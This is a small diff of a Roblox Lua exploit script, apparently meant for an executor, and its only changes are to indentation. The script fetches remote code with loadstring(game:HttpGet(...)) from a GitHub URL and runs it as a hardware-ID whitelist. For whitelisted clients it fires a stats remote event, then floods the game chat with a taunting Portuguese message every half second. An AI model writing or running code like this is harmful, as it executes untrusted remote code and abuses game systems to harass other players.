@@ -1,11 +1,11 @@
 local WhiteL = loadstring(game:HttpGet("https://raw.githubusercontent.com/FLORSACCOUNT/HWID/main/Whitelist"))()
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 for i,v in pairs(WhiteL) do
-	if v == hwid then
-	print("Loading the script ...")
+if v == hwid then
+print("Loading the script ...")
 workspace.UserData['User_'..game.Players.LocalPlayer.UserId].Stats:FireServer()
 while task.wait(0.5) do
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("FUI TROLLADO PELO FLORS KKKKKKKKKKK", "All")
 end
-	end
+    end
 end
